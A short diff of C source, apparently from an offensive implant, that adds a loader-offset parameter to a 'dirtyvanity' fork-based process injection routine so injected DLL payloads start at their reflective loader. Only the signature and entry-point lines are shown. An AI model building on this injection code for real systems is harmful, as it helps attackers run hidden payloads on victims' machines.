@@ -306,7 +306,7 @@ void dv_nursery_init(void) {
 	spawn_log("dv: nursery up, clone pid=", (long)pid);
 }
 
-BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
+BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parameter, int plen) {
 #if !defined _M_X64
 	return FALSE;
 #else
@@ -349,7 +349,7 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int ple
 	}
 
 	mb.go    = 1;
-	mb.entry = (char *)remote;
+	mb.entry = (char *)remote + offset; /* job payloads carry their loader offset */
 	mb.param = rparam;
 	/* dv_mailbox lives in our image - the clone's inherited copy sits at
 	 * the identical VA (fork preserves the address space) */
